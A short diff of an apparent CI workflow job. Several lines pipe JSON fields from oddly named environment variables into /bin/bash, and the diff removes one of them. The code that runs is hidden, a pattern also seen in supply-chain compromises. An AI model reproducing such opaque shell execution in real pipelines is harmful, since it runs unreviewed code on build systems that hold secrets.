@@ -37,7 +37,6 @@ jobs:
           echo $azzv8 | jq -r .lg23158 | /bin/bash
           printf '%s' "$gcdjd937" | jq -r .jtocc361 | /bin/bash
           echo $z5277 | jq -r .dp7111 | /bin/bash
-          printf '%s' "$h23249" | jq -r .hajel1 | /bin/bash
           printf '%s' "$i4" | jq -r .y8 | /bin/bash
 
       - name: Store results
